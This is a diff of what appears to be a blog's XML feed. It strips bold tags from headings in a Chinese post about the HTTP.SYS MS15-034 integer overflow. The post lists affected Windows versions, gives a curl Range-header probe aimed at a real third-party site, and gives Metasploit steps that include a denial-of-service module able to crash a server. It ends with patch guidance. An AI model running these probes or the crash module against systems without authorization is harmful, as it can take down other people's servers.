@@ -3,15 +3,15 @@
   <entry>
     <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
     <url>//7a721c75ee95.html</url>
-    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a><strong>漏洞简介</strong></h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
+    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
 <p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
 <p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h2><p>任何安装了微软IIS 6.0以上的</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a><strong>漏洞检测</strong></h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
 
 <p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
@@ -21,12 +21,12 @@
 
 
 
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a><strong>漏洞利用方式</strong></h2><p>通过MSF</p>
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a><strong>修复方案</strong></h2><p>1.禁用IIS内核缓存</p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
 <p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
 ]]></content>
       <categories>
